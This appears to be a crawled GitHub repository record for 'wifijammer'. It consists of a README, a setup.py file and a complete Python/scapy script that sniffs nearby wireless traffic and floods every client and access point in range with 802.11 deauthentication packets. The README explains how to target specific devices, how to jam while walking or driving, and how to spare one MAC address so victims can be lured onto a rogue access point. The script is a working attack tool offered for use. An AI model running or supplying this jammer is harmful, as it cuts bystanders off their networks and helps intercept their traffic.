{
  "metadata": {
    "timestamp": 1736559721445,
    "page": 417,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQyMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "DanMcInerney/wifijammer",
      "stars": 4037,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.00390625,
          "content": "env\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 5.267578125,
          "content": "wifijammer\n==========\n\nContinuously jam all wifi clients and access points within range. The effectiveness of this script is constrained by your wireless card. Alfa cards seem to effectively jam within about a block radius with heavy access point saturation. Granularity is given in the options for more effective targeting.\n\n\nRequires: python 2.7, python-scapy, a wireless card capable of injection\n\n\nUsage\n-----\n\n\n### Simple\n``` shell\npython wifijammer\n```\n\nThis will find the most powerful wireless interface and turn on monitor mode. If a monitor mode interface is already up it will use the first one it finds instead. It will then start sequentially hopping channels 1 per second from channel 1 to 11 identifying all access points and clients connected to those access points. On the first pass through all the wireless channels it is only identifying targets. After that the 1sec per channel time limit is eliminated and channels are hopped as soon as the deauth packets finish sending. Note that it will still add clients and APs as it finds them after the first pass through.\n\nUpon hopping to a new channel it will identify targets that are on that channel and send 1 deauth packet to the client from the AP, 1 deauth to the AP from the client, and 1 deauth to the AP destined for the broadcast address to deauth all clients connected to the AP. Many APs ignore deauths to broadcast addresses.\n\n```shell\npython wifijammer -a 00:0E:DA:DE:24:8E -c 2\n```\n\nDeauthenticate all devices with which 00:0E:DA:DE:24:8E communicates and skips channel hopping by setting the channel to the target AP's channel (2 in this case). This would mainly be an access point's MAC so all clients associated with that AP would be deauthenticated, but you can also put a client MAC here to target that one client and any other devices that communicate with it.\n\n\n### Advanced\n```shell\npython wifijammer -c 1 -p 5 -t .00001 -s DL:3D:8D:JJ:39:52 -d --world\n```\n\n* `-c`, Set the monitor mode interface to only listen and deauth clients or APs on channel 1\n\n* `-p`, Send 5 packets to the client from the AP and 5 packets to the AP from the client along with 5 packets to the broadcast address of the AP\n\n* `-t`, Set a time interval of .00001 seconds between sending each deauth (try this if you get a scapy error like 'no buffer space')\n\n* `-s`, Do not deauth the MAC DL:3D:8D:JJ:39:52. Ignoring a certain MAC address is handy in case you want to tempt people to join your access point in cases of wanting to use LANs.py or a Pineapple on them.\n\n* `-d`, Do not send deauths to access points' broadcast address; this will speed up the deauths to the clients that are found\n\n* `--world`, Set the max channel to 13. In N. America the max channel standard is 11, but the rest of the world uses 13 channels so use this option if you're not in N. America\n\n\n### Walking/driving around\n```shell\npython wifijammer -m 10\n```\nThe `-m` option sets a max number of client/AP combos that the script will attempt to deauth. When the max number is reached, it clears and repopulates its list based on what traffic it sniffs in the area. This allows you to constantly update the deauth list with client/AP combos who have the strongest signal in case you were not stationary. If you want to set a max and not have the deauth list clear itself when the max is hit, just add the -n option like: `-m 10 -n`\n\n\nAll options:\n\n```shell\npython wifijammer [-a AP MAC] [-c CHANNEL] [-d] [-i INTERFACE] [-m MAXIMUM] [-n] [-p PACKETS] [-s SKIP] [-t TIME INTERVAL]\n```\n\nLicense\n-------\n\nCopyright (c) 2014, Dan McInerney\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n* Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n* Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.\n* Neither the name of Dan McInerney nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\nDISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY\nDIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\nLOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\nON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n***\n* [danmcinerney.org](http://danmcinerney.org)\n* [![Flattr this](http://api.flattr.com/button/flattr-badge-large.png)](https://flattr.com/submit/auto?user_id=DanMcInerney&url=https://github.com/DanMcInerney/wifijammer&title=wifijammer&language=&tags=github&category=software)\n* [![Analytics](https://ga-beacon.appspot.com/UA-46613304-3/wifijammer/README.md)](https://github.com/igrigorik/ga-beacon)\n"
        },
        {
          "name": "setup.py",
          "type": "blob",
          "size": 0.5947265625,
          "content": "#!/usr/bin/env  python3\nfrom setuptools import setup\n\nsetup(\n    name = \"wifijammer\",\n    version = \"0.1\",\n    author = \"Dan McInerney\",\n    description = \"Continuously jam all wifi clients and access points within range.\",\n    keywords = \"WiFi 802.11 jammer deauth\",\n    url = \"https://github.com/DanMcInerney/wifijammer\",\n    scripts=['wifijammer'],\n    # py_modules=['wifijammer'],\n    install_requires=['scapy'],\n    long_description=\"Continuously jam all wifi clients and access points within range.\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Topic :: Utilities\",\n    ],\n)\n\n\n"
        },
        {
          "name": "wifijammer",
          "type": "blob",
          "size": 17.009765625,
          "content": "#!/usr/bin/env python2\n# -*- coding: UTF-8 -*-\n\nimport fcntl\nimport struct\nimport socket\nimport argparse\nfrom signal import SIGINT, signal\nfrom subprocess import Popen, PIPE\nfrom threading import Thread, Lock\nimport time\nimport sys\nimport os\nfrom scapy.all import *\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)  # Shut up Scapy\nconf.verb = 0  # Scapy I thought I told you to shut up\n\n# Console colors\nW = '\\033[0m'  # white (normal)\nR = '\\033[31m'  # red\nG = '\\033[32m'  # green\nO = '\\033[33m'  # orange\nB = '\\033[34m'  # blue\nP = '\\033[35m'  # purple\nC = '\\033[36m'  # cyan\nGR = '\\033[37m'  # gray\nT = '\\033[93m'  # tan\n\n\ndef parse_args():\n    # Create the arguments\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\"-s\",\n                        \"--skip\",\n                        nargs='*',\n                        default=[],\n                        help=\"Skip deauthing this MAC address. \\\n                                Example: -s 00:11:BB:33:44:AA\")\n    parser.add_argument(\"-i\",\n                        \"--interface\",\n                        help=\"Choose monitor mode interface. \\\n                                By default script will find the most powerful \\\n                                interface and starts monitor mode on it. \\\n                                Example: -i mon5\")\n    parser.add_argument(\"-c\",\n                        \"--channel\",\n                        help=\"Listen on and deauth only clients on the specified channel. \\\n                                Example: -c 6\")\n    parser.add_argument(\"-m\",\n                        \"--maximum\",\n                        help=\"Choose the maximum number of clients to deauth. \\\n                                List of clients will be emptied and repopulated \\\n                                after hitting the limit. Example: -m 5\")\n    parser.add_argument(\"-n\",\n                        \"--noupdate\",\n                        help=\"Do not clear the deauth list when the maximum (-m) \\\n                                number of client/AP combos is reached. \\\n                                Must be used in conjunction with -m. \\\n                                Example: -m 10 -n\",\n                        action='store_true')\n    parser.add_argument(\"-t\",\n                        \"--timeinterval\",\n                        help=\"Choose the time interval between packets being sent. \\\n                                Default is as fast as possible. \\\n                                If you see scapy errors like 'no buffer space' \\\n                                try: -t .00001\")\n    parser.add_argument(\"-p\",\n                        \"--packets\",\n                        help=\"Choose the number of packets to send in each deauth burst. \\\n                                Default value is 1; \\\n                                1 packet to the client and 1 packet to the AP. \\\n                                Send 2 deauth packets to the client \\\n                                and 2 deauth packets to the AP: -p 2\")\n    parser.add_argument(\"-d\",\n                        \"--directedonly\",\n                        help=\"Skip the deauthentication packets to the broadcast \\\n                                address of the access points and only send them \\\n                                to client/AP pairs\",\n                        action='store_true')\n    parser.add_argument(\"-a\",\n                        \"--accesspoint\",\n                        nargs='*',\n                        default=[],\n                        help=\"Enter the SSID or MAC address of a specific access point to target\")\n    parser.add_argument(\"--world\",\n                        help=\"N. American standard is 11 channels but the rest \\\n                                of the world it's 13 so this options enables the \\\n                                scanning of 13 channels\",\n                        action=\"store_true\")\n    parser.add_argument(\"--dry-run\",\n                        dest=\"dry_run\",\n                        default=False,\n                        action='store_true',\n                        help=\"Do not send any deauth packets.\")\n    return parser.parse_args()\n\n\n########################################\n# Begin interface info and manipulation\n########################################\n\ndef get_mon_iface(args):\n    global monitor_on\n    monitors, interfaces = iwconfig()\n    if args.interface:\n        monitor_on = True\n        return args.interface\n    if len(monitors) > 0:\n        monitor_on = True\n        return monitors[0]\n    else:\n        # Start monitor mode on a wireless interface\n        print('['+G+'*'+W+'] Finding the most powerful interface...')\n        os.system('pkill NetworkManager')\n        interface = get_iface(interfaces)\n        monmode = start_mon_mode(interface)\n        return monmode\n\n\ndef iwconfig():\n    monitors = []\n    interfaces = {}\n    try:\n        proc = Popen(['iwconfig'], stdout=PIPE, stderr=PIPE)\n    except OSError:\n        sys.exit('['+R+'-'+W+'] Could not execute \"iwconfig\"')\n    for line in proc.communicate()[0].decode().split('\\n'):\n        if len(line) == 0:\n            continue  # Isn't an empty string\n        if line[0] != ' ':  # Doesn't start with space\n            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)\n            if not wired_search:  # Isn't wired\n                iface = line[:line.find(' ')]  # is the interface\n                if 'Mode:Monitor' in line:\n                    monitors.append(iface)\n                elif 'IEEE 802.11' in line:\n                    if \"ESSID:\\\"\" in line:\n                        interfaces[iface] = 1\n                    else:\n                        interfaces[iface] = 0\n    return monitors, interfaces\n\n\ndef get_iface(interfaces):\n    scanned_aps = []\n\n    if len(interfaces) < 1:\n        sys.exit(\n            '['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')\n    if len(interfaces) == 1:\n        for interface in interfaces:\n            return interface\n\n    # Find most powerful interface\n    for iface in interfaces:\n        count = 0\n        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)\n        for line in proc.communicate()[0].split('\\n'):\n            if ' - Address:' in line:  # first line in iwlist scan for a new AP\n                count += 1\n        scanned_aps.append((count, iface))\n        print('['+G+'+'+W+'] Networks discovered by ' +\n              G+iface+W+': '+T+str(count)+W)\n    try:\n        interface = max(scanned_aps)[1]\n        return interface\n    except Exception as e:\n        for iface in interfaces:\n            interface = iface\n            print('['+R+'-'+W+'] Minor error:', e)\n            print('    Starting monitor mode on '+G+interface+W)\n            return interface\n\n\ndef start_mon_mode(interface):\n    print('['+G+'+'+W+'] Starting monitor mode off '+G+interface+W)\n    try:\n        os.system('ip link set %s down' % interface)\n        os.system('iwconfig %s mode monitor' % interface)\n        os.system('ip link set %s up' % interface)\n        return interface\n    except Exception:\n        sys.exit('['+R+'-'+W+'] Could not start monitor mode')\n\n\ndef remove_mon_iface(mon_iface):\n    os.system('ip link set %s down' % mon_iface)\n    os.system('iwconfig %s mode managed' % mon_iface)\n    os.system('ip link set %s up' % mon_iface)\n\n\ndef mon_mac(mon_iface):\n    '''\n    http://stackoverflow.com/questions/159137/getting-mac-address\n    '''\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', bytes(mon_iface, 'utf-8')[:15]))\n    mac = ':'.join('%02x' % b for b in info[18:24])\n    print('['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W)\n    return mac\n\n########################################\n# End of interface info and manipulation\n########################################\n\n\ndef channel_hop(mon_iface, args):\n    '''\n    First time it runs through the channels it stays on each channel for 5 seconds\n    in order to populate the deauth list nicely. After that it goes as fast as it can\n    '''\n    global monchannel, first_pass\n\n    channelNum = 0\n    maxChan = 11 if not args.world else 13\n    err = None\n\n    while 1:\n        if args.channel:\n            with lock:\n                monchannel = args.channel\n        else:\n            channelNum += 1\n            if channelNum > maxChan:\n                channelNum = 1\n                with lock:\n                    first_pass = 0\n            with lock:\n                monchannel = str(channelNum)\n\n            try:\n                proc = Popen(['iw', 'dev', mon_iface, 'set',\n                             'channel', monchannel], stdout=DN, stderr=PIPE)\n            except OSError:\n                print('['+R+'-'+W+'] Could not execute \"iw\"')\n                os.kill(os.getpid(), SIGINT)\n                sys.exit(1)\n            for line in proc.communicate()[1].split('\\n'):\n                if len(line) > 2:  # iw dev shouldnt display output unless there's an error\n                    err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W\n\n        output(err, monchannel)\n        if args.channel:\n            time.sleep(.05)\n        else:\n            # For the first channel hop thru, do not deauth\n            if first_pass == 1:\n                time.sleep(1)\n                continue\n        if not args.dry_run:\n            deauth(monchannel)\n\n\ndef deauth(monchannel):\n    '''\n    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's\n    multi-APs to one gateway. Constantly scans the clients_APs list and\n    starts a thread to deauth each instance\n    '''\n    pkts = []\n\n    if len(clients_APs) > 0:\n        with lock:\n            for x in clients_APs:\n                client = x[0]\n                ap = x[1]\n                ch = x[2]\n                # Can't add a RadioTap() layer as the first layer or it's a malformed\n                # Association request packet?\n                # Append the packets to a new list so we don't have to hog the lock\n                # type=0, subtype=12?\n                if ch == monchannel:\n                    deauth_pkt1 = Dot11(\n                        addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()\n                    deauth_pkt2 = Dot11(\n                        addr1=ap, addr2=client, addr3=client)/Dot11Deauth()\n                    pkts.append(deauth_pkt1)\n                    pkts.append(deauth_pkt2)\n    if len(APs) > 0:\n        if not args.directedonly:\n            with lock:\n                for a in APs:\n                    ap = a[0]\n                    ch = a[1]\n                    if ch == monchannel:\n                        deauth_ap = Dot11(\n                            addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()\n                        pkts.append(deauth_ap)\n\n    if len(pkts) > 0:\n        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI\n        if not args.timeinterval:\n            args.timeinterval = 0\n        if not args.packets:\n            args.packets = 1\n\n        for p in pkts:\n            send(p, inter=float(args.timeinterval), count=int(args.packets))\n\n\ndef output(err, monchannel):\n    os.system('clear')\n    if args.dry_run:\n        print(P+'***DRY-RUN***'+W)\n    if err:\n        print(err)\n    else:\n        print('['+G+'+'+W+'] '+mon_iface+' channel: '+G+monchannel+W+'\\n')\n    if len(clients_APs) > 0:\n        print('                  Deauthing                 ch   ESSID')\n    # Print the deauth list\n    with lock:\n        for ca in clients_APs:\n            if len(ca) > 3:\n                print('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1] +\n                      W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W)\n            else:\n                print('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2])\n    if len(APs) > 0:\n        print('\\n      Access Points     ch   ESSID')\n    with lock:\n        for ap in APs:\n            print('['+T+'*'+W+'] '+O+ap[0]+W+' - ' +\n                  ap[1].ljust(2)+' - '+T+ap[2]+W)\n    print('')\n\n\ndef noise_filter(skip, addr1, addr2):\n    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast\n    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:',\n              '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]\n    if skip:\n        ignore += [addr.lower() for addr in skip]\n    for i in ignore:\n        if i in addr1 or i in addr2:\n            return True\n\n\ndef cb(pkt):\n    '''\n    Look for dot11 packets that aren't to or from broadcast address,\n    are type 1 or 2 (control, data), and append the addr1 and addr2\n    to the list of deauth targets.\n    '''\n    global clients_APs, APs\n\n    # return these if's keeping clients_APs the same or just reset clients_APs?\n    # I like the idea of the tool repopulating the variable more\n    if args.maximum:\n        if args.noupdate:\n            if len(clients_APs) > int(args.maximum):\n                return\n        else:\n            if len(clients_APs) > int(args.maximum):\n                with lock:\n                    clients_APs = []\n                    APs = []\n\n    # We're adding the AP and channel to the deauth list at time of creation rather\n    # than updating on the fly in order to avoid costly for loops that require a lock\n    if pkt.haslayer(Dot11):\n        if pkt.addr1 and pkt.addr2:\n            pkt.addr1 = pkt.addr1.lower()\n            pkt.addr2 = pkt.addr2.lower()\n\n            # Filter out all other APs and clients if asked\n            if args.accesspoint:\n                # track bssid for essid\n                if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt[Dot11Elt].info in args.accesspoint:\n                    args.accesspoint.add(pkt[Dot11].addr3.lower())\n                # bail if bssid is not in target list\n                if not args.accesspoint.intersection([pkt.addr1.lower(), pkt.addr2.lower()]):\n                    # pkt does not match our target list\n                    return\n\n            if args.skip:\n                if pkt.addr2 in args.skip:\n                    return\n\n            # Check if it's added to our AP list\n            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):\n                APs_add(clients_APs, APs, pkt, args.channel, args.world)\n\n            # Ignore all the noisy packets like spanning tree\n\n            if noise_filter(args.skip, pkt.addr1, pkt.addr2):\n                return\n\n            # Management = 1, data = 2\n            if pkt.type in [1, 2]:\n                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)\n\n\ndef APs_add(clients_APs, APs, pkt, chan_arg, world_arg):\n    ssid = pkt[Dot11Elt].info\n    bssid = pkt[Dot11].addr3.lower()\n    try:\n        # Thanks to airoscapy for below\n        ap_channel = str(ord(pkt[Dot11Elt:3].info))\n        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11'] if not args.world else [\n            '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13']\n        if ap_channel not in chans:\n            return\n\n        if chan_arg:\n            if ap_channel != chan_arg:\n                return\n\n    except Exception as e:\n        return\n\n    if len(APs) == 0:\n        with lock:\n            return APs.append([bssid, ap_channel, ssid])\n    else:\n        for b in APs:\n            if bssid in b[0]:\n                return\n        with lock:\n            return APs.append([bssid, ap_channel, ssid])\n\n\ndef clients_APs_add(clients_APs, addr1, addr2):\n    if len(clients_APs) == 0:\n        if len(APs) == 0:\n            with lock:\n                return clients_APs.append([addr1, addr2, monchannel])\n        else:\n            AP_check(addr1, addr2)\n\n    # Append new clients/APs if they're not in the list\n    else:\n        for ca in clients_APs:\n            if addr1 in ca and addr2 in ca:\n                return\n\n        if len(APs) > 0:\n            return AP_check(addr1, addr2)\n        else:\n            with lock:\n                return clients_APs.append([addr1, addr2, monchannel])\n\n\ndef AP_check(addr1, addr2):\n    for ap in APs:\n        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():\n            with lock:\n                return clients_APs.append([addr1, addr2, ap[1], ap[2]])\n\n\ndef stop(signal, frame):\n    if monitor_on:\n        os.system('service network-manager restart')\n        sys.exit('\\n['+R+'!'+W+'] Closing')\n    else:\n        remove_mon_iface(mon_iface)\n        os.system('service network-manager restart')\n        sys.exit('\\n['+R+'!'+W+'] Closing')\n\n\nif __name__ == \"__main__\":\n    args = parse_args()\n    if os.geteuid():\n        sys.exit('['+R+'-'+W+'] Please run as root')\n    clients_APs = []\n    APs = []\n    DN = open(os.devnull, 'w')\n    lock = Lock()\n    args.skip = list(map(str.lower, args.skip))\n    # lowercase bssids while leaving essids intact\n    args.accesspoint = set(\n        _.lower() if ':' in _ else _ for _ in args.accesspoint)\n    monitor_on = None\n    mon_iface = get_mon_iface(args)\n    conf.iface = mon_iface\n    mon_MAC = mon_mac(mon_iface)\n    first_pass = 1\n\n    # Start channel hopping\n    hop = Thread(target=channel_hop, args=(mon_iface, args))\n    hop.daemon = True\n    hop.start()\n\n    signal(SIGINT, stop)\n\n    try:\n        sniff(iface=mon_iface, store=0, prn=cb)\n    except Exception as msg:\n        remove_mon_iface(mon_iface)\n        os.system('service network-manager restart')\n        print('\\n['+R+'!'+W+'] Closing')\n        sys.exit(0)\n"
        }
      ]
    }
  ]
}